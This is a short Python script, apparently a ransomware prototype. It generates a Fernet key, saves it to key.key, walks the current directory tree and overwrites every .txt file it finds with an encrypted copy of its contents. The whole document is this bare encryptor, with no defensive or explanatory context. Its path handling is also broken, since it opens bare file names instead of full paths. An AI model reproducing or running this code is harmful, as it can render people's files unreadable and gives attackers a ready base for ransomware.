from cryptography.fernet import Fernet
import os

# Generate a symmetric encryption key
key = Fernet.generate_key()

# Write the generated key into a file for later use
with open("key.key", "wb") as f:
    f.write(key)

# Create a Fernet object for encryption using the generated key
fernet = Fernet(key)

# Traverse through all directories and files in the current working directory
for folder in os.walk(os.getcwd()):
    for file in folder[2]:
        if str(file).endswith(".txt"):
            # Open the text file in read mode
            with open(str(file), "r") as f:
                data = f.read()
            
            # Encrypt the data read from the file
            encrypted = fernet.encrypt(data.encode())

            # Write the encrypted data back to the same file, overwriting it
            with open(str(file), "wb") as f:
                f.write(encrypted)

print("done")
